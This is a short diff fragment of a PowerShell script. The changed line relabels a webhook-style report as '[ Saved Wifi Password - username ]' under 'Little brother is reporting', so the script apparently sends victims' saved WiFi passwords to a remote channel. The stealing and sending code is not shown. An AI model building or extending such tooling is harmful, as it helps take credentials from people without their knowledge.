@@ -24,7 +24,7 @@ param (
 
 $building =  [PSCustomObject]@{
     'title'       = 'Incoming transmission!'
-    'description' = '[' + $env:username + ']' + 'Little brother is reporting:' + [string]$text
+    'description' = '[ Saved Wifi Password -' + $env:username + '] ' + 'Little brother is reporting:'
     'color'       = '16744960'
 }
 
